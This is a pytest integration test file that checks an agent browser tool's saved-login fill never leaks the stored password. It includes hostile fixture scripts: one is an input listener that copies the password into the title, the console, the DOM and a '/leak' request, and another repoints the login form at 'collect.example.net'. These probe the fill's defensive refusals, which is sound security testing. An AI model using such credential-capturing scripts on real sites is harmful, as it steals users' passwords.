"""Saved-login fill on real Chrome: sentinel tests for the C5-C7 boundary, and a real sign-in that works and one
that the site rejects.

Run through the isolated host browser environment:
CORSIA_BROWSER_E2E=1 CORSIA_NATIVE_BROWSER_TEST=1 ... python -m pytest tests/test_browser_login_fill_e2e.py -m integration

The fixture site is plain http on 127.0.0.1, so each test admits that one origin through the fill's single
https check (browser_login_page.https_url). The approval is a stand-in that is always live; the saved value is
a real saved login's. In every test the value must be in no agent output, log record at DEBUG, product event,
person-step instruction or module global.
"""
from __future__ import annotations

import base64
import logging
import os
import shlex
from contextlib import contextmanager
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from threading import Thread
from types import SimpleNamespace
from urllib.parse import parse_qs
from uuid import uuid4

import pytest

from host_access import (
    browser_cdp, browser_control, browser_fill_marks, browser_login_fill as fill, browser_login_page as page,
    browser_session_commands, browser_step_lifecycle as lifecycle,
)
from host_access.browser_sessions import BrowserSessionOwner
from infra import saved_login_fills, saved_logins
from tests.test_browser_shared_e2e import _quiet_password_steps
from tools import browser_runtime

USER = "me@example.com"
FORM = """<form method=post action=/session>
<input type=email name=user autocomplete=username><input type=password name=pw><button type=submit>Sign in</button>
</form>"""
LOGIN = f"<!doctype html><title>Sign in</title>{FORM}"
REJECTED = f"<!doctype html><title>Sign in</title><p>That password didn't work.</p>{FORM}"
HOME = "<!doctype html><title>Home</title><main><h1>Welcome</h1></main>"
# The form shows only after "Show sign-in", so an agent can run a script on the page before any password field shows.
LATER = f"""<!doctype html><title>Account</title><button onclick="document.querySelector('form').hidden = false">
Show sign-in</button>{FORM.replace('<form ', '<form hidden ')}"""
MOVED = LOGIN + "<script>document.querySelector('form').action = 'https://collect.example.net/p';</script>"
# The password field shows its text once focused: a password must never go into a visible text field.
FLIPS = LOGIN.replace("<input type=password name=pw>", "<input type=password name=pw onfocus=\"this.type = 'text'\">")
# A service worker sees every later request of its scope, on every later page of the site.
WORKER = "self.addEventListener('fetch', () => {});"
# An agent's input listener that copies the password field anywhere an agent could read it.
COPIER = ("document.querySelector('input[type=password]').addEventListener('input', event => {"
          " const value = event.target.value; document.title = value; console.log(value);"
          " const p = document.createElement('p'); p.textContent = btoa(value); document.body.append(p);"
          " fetch('/leak?v=' + encodeURIComponent(value)); }); 'added'")


@contextmanager
def site(accepted: str, *, reject: bool = False):
    posts: list[dict] = []
    pages = {"/login.html": LOGIN, "/home.html": HOME, "/later.html": LATER, "/moved.html": MOVED, "/flips.html": FLIPS}

    class Handler(BaseHTTPRequestHandler):
        def _send(self, status: int, body: str = "", location: str | None = None, kind: str = "text/html") -> None:
            data = body.encode()
            self.send_response(status)
            if location:
                self.send_header("Location", location)
            self.send_header("Content-Type", f"{kind}; charset=utf-8")
            self.send_header("Content-Length", str(len(data)))
            self.end_headers()
            self.wfile.write(data)

        def do_GET(self):  # noqa: N802 - BaseHTTPRequestHandler protocol name
            path = self.path.split("?")[0]
            if path == "/sw.js":
                return self._send(200, WORKER, kind="text/javascript")
            body = pages.get(path)
            self._send(200, body) if body else self._send(404)

        def do_POST(self):  # noqa: N802
            fields = parse_qs(self.rfile.read(int(self.headers.get("Content-Length", 0))).decode())
            posts.append({"user": fields.get("user", [""])[0], "matched": fields.get("pw", [""])[0] == accepted})
            if posts[-1]["matched"] and not reject:
                self._send(303, location="/home.html")
            else:
                self._send(200, REJECTED)

        def log_message(self, *_args):
            pass

    server = ThreadingHTTPServer(("127.0.0.1", 0), Handler)
    thread = Thread(target=server.serve_forever, daemon=True)
    thread.start()
    try:
        yield f"http://127.0.0.1:{server.server_port}", posts
    finally:
        server.shutdown()
        thread.join(timeout=5)
        server.server_close()


@pytest.fixture
def browser(isolated_db, tmp_path, monkeypatch, caplog):
    if os.environ.get("CORSIA_BROWSER_E2E") != "1":
        pytest.skip("set CORSIA_BROWSER_E2E=1 in the isolated host browser environment")
    root = tmp_path / "state"
    root.mkdir()
    monkeypatch.setattr("infra.config.STATE_ROOT", root)
    caplog.set_level(logging.DEBUG)
    owner = BrowserSessionOwner(namespace="corsia-login-fill", instance_key=uuid4().hex)
    run = SimpleNamespace(owner=owner, thread=f"login-fill-{uuid4().hex}", outputs=[], events=[], steps=[],
                          sentinel=f"Sentinel-{uuid4().hex}")

    async def run_browser(thread, args, **kwargs):
        kwargs.pop("lease_id", None)
        return await owner.run(thread, args, **kwargs)

    def event(_surface, action, **kwargs):
        run.events.append(repr((action, kwargs)))

    _quiet_password_steps(monkeypatch, run.steps)
    monkeypatch.setattr(browser_runtime.PROCESS_OWNER, "run_browser", run_browser)
    monkeypatch.setattr(browser_runtime, "_check_installed", lambda: None)
    monkeypatch.setattr(browser_session_commands, "emit_product_event", event)
    monkeypatch.setattr(lifecycle, "emit_product_event", event)
    monkeypatch.setattr(fill, "_owner", lambda: owner)
    monkeypatch.setattr(saved_login_fills, "may_fill", lambda *_args: True)
    declared: list[str] = []
    real_declare = owner.declare_person_step

    async def declare(thread, instruction):
        declared.append(instruction)
        await real_declare(thread, instruction)

    monkeypatch.setattr(owner, "declare_person_step", declare)
    run.declared = declared
    yield run
    _never_shown(run, caplog)


def _never_shown(run, caplog) -> None:
    forms = {run.sentinel, base64.b64encode(run.sentinel.encode()).decode()}
    modules = (fill, page, browser_fill_marks, browser_control, lifecycle, saved_login_fills)
    held = [caplog.text, *(repr(record.args) for record in caplog.records), *run.outputs, *run.events,
            *run.steps, *run.declared, *(repr(vars(module)) for module in modules)]
    assert not [text for text in held if any(form in text for form in forms)]


async def _agent(run, *args: str) -> str:
    """One agent browser command through the tool path (blanking and marks included); errors are outputs too."""
    try:
        text = await browser_runtime._run(list(args), thread_id=run.thread)
    except Exception as exc:  # noqa: BLE001 - a refusal is an output the agent reads
        text = f"Error: {exc}"
    run.outputs.append(text)
    return text


def _admit_fixture(monkeypatch, origin: str) -> str:
    """Let the fill's https check admit the fixture's http origin; return the site the login is saved for."""
    https_origin = origin.replace("http://", "https://", 1)
    real = page.https_url
    monkeypatch.setattr(page, "https_url", lambda url: url.replace(origin, https_origin, 1)
                        if isinstance(url, str) and url.startswith(origin) else real(url))
    return https_origin


def _save(run, site_origin: str) -> str:
    return saved_logins.save_login(site=site_origin, username=USER, password=run.sentinel, saved_by="person")


async def _after_fill_reads(run) -> None:
    """What an agent could try to read after a fill; each answer joins the outputs checked for the value."""
    for args in (("snapshot",), ("snapshot", "-i"), ("get", "text", "body"), ("console",), ("network", "requests"),
                 ("eval", "document.title"), ("get", "title")):
        await _agent(run, *args)


@pytest.mark.integration
@pytest.mark.asyncio
@pytest.mark.parametrize("batched", [False, True])
async def test_a_listener_an_agent_added_never_sees_the_value(browser, monkeypatch, batched):
    """An agent's eval, alone or in a batch after an open, adds an input listener that copies the field anywhere
    readable. Its script marked the site (alone) or the session (batch), so the sign-in is the person's."""
    with site("unused") as (origin, posts):
        site_origin = _admit_fixture(monkeypatch, origin)
        login_id = _save(browser, site_origin)
        try:
            if batched:
                added = await _agent(browser, "batch", f"open {origin}/later.html", f"eval {shlex.quote(COPIER)}")
            else:
                await _agent(browser, "open", f"{origin}/later.html")
                added = await _agent(browser, "eval", COPIER)
            assert "added" in added, added
            await _agent(browser, "click", "button")
            text = await fill.fill_saved_login(browser.thread, login_id)
            browser.outputs.append(text)
            assert text.startswith(fill.NOT_CLEAN.format(site=site_origin)), text
            assert browser.declared == [f"Sign in to {site_origin} yourself"]
            assert posts == []
            await _after_fill_reads(browser)
        finally:
            await browser.owner.shutdown()


@pytest.mark.integration
@pytest.mark.asyncio
async def test_a_service_worker_an_agent_registered_on_another_page_of_the_site_makes_the_sign_in_the_persons(
        browser, monkeypatch):
    with site("unused") as (origin, posts):
        site_origin = _admit_fixture(monkeypatch, origin)
        login_id = _save(browser, site_origin)
        try:
            await _agent(browser, "open", f"{origin}/home.html")
            registered = await _agent(browser, "eval", "navigator.serviceWorker.register('/sw.js')"
                                      ".then(() => navigator.serviceWorker.ready).then(() => 'registered')")
            assert "registered" in registered, registered
            await _agent(browser, "open", f"{origin}/login.html")
            text = await fill.fill_saved_login(browser.thread, login_id)
            browser.outputs.append(text)
            assert text.startswith(fill.NOT_CLEAN.format(site=site_origin)), text
            assert browser.declared == [f"Sign in to {site_origin} yourself"]
            assert posts == []
            await _after_fill_reads(browser)
        finally:
            await browser.owner.shutdown()


@pytest.mark.integration
@pytest.mark.asyncio
async def test_a_form_whose_action_was_pointed_at_another_site_is_refused(browser, monkeypatch):
    with site("unused") as (origin, posts):
        login_id = _save(browser, _admit_fixture(monkeypatch, origin))
        try:
            await _agent(browser, "open", f"{origin}/moved.html")
            text = await fill.fill_saved_login(browser.thread, login_id)
            browser.outputs.append(text)
            assert text == fill.REFUSED["form_action"].format(site=_admit_fixture(monkeypatch, origin)), text
            assert posts == []
            await _after_fill_reads(browser)
        finally:
            await browser.owner.shutdown()


@pytest.mark.integration
@pytest.mark.asyncio
async def test_a_password_field_that_turns_into_a_text_field_gets_nothing(browser, monkeypatch):
    with site("unused") as (origin, posts):
        site_origin = _admit_fixture(monkeypatch, origin)
        login_id = _save(browser, site_origin)
        try:
            await _agent(browser, "open", f"{origin}/flips.html")
            text = await fill.fill_saved_login(browser.thread, login_id)
            browser.outputs.append(text)
            assert text == fill.REFUSED["changed"].format(site=site_origin), text
            assert posts == []
            async with browser_cdp.CdpClient(await browser.owner.page_endpoint(browser.thread)) as cdp:
                typed = await cdp.call("Runtime.evaluate", returnByValue=True,
                                       expression="document.querySelector('input[name=pw]').value.length")
            assert typed["result"]["value"] == 0
            await _after_fill_reads(browser)
        finally:
            await browser.owner.shutdown()


@pytest.mark.integration
@pytest.mark.asyncio
async def test_an_agent_network_route_makes_the_sign_in_the_persons(browser, monkeypatch):
    with site("unused") as (origin, posts):
        site_origin = _admit_fixture(monkeypatch, origin)
        login_id = _save(browser, site_origin)
        try:
            await _agent(browser, "open", f"{origin}/home.html")
            await _agent(browser, "network", "route", "**/never-requested")
            await _agent(browser, "open", f"{origin}/login.html")
            text = await fill.fill_saved_login(browser.thread, login_id)
            browser.outputs.append(text)
            assert text.startswith(fill.NOT_CLEAN.format(site=site_origin)), text
            assert browser.declared == [f"Sign in to {site_origin} yourself"]
            assert posts == []
            await _after_fill_reads(browser)
        finally:
            await browser.owner.shutdown()


@pytest.mark.integration
@pytest.mark.asyncio
async def test_a_clean_sign_in_fills_submits_and_reports_success(browser, monkeypatch):
    with site(browser.sentinel) as (origin, posts):
        site_origin = _admit_fixture(monkeypatch, origin)
        login_id = _save(browser, site_origin)
        try:
            await _agent(browser, "open", f"{origin}/login.html")
            text = await fill.fill_saved_login(browser.thread, login_id)
            browser.outputs.append(text)
            assert text == f"Signed in to {site_origin} as {USER} with the saved login.", text
            assert posts == [{"user": USER, "matched": True}]
            assert saved_logins.get_login(login_id).last_used_by_thread_id == browser.thread
            # From the fill on, the whole session runs only the saved-sign-in commands, on every page.
            assert browser_session_commands.SAVED_FILL_SESSION_REFUSED in await _agent(browser, "eval", "document.title")
            await _after_fill_reads(browser)
        finally:
            await browser.owner.shutdown()


@pytest.mark.integration
@pytest.mark.asyncio
async def test_a_rejected_sign_in_marks_the_login_out_of_date_and_gives_the_person_the_sign_in(browser, monkeypatch):
    with site(browser.sentinel, reject=True) as (origin, posts):
        site_origin = _admit_fixture(monkeypatch, origin)
        login_id = _save(browser, site_origin)
        try:
            await _agent(browser, "open", f"{origin}/login.html")
            text = await fill.fill_saved_login(browser.thread, login_id)
            browser.outputs.append(text)
            rejected = (f"The saved login for {site_origin} ({USER}) didn't work, so it's now marked out of date. "
                        f"The person has a step to sign in to {site_origin} themselves.")
            assert text.startswith(rejected), text
            assert posts == [{"user": USER, "matched": True}]
            assert saved_logins.get_login(login_id).status == saved_logins.STATUS_OUT_OF_DATE
            assert browser.declared == [f"Sign in to {site_origin} yourself"]
            await _after_fill_reads(browser)
        finally:
            await browser.owner.shutdown()
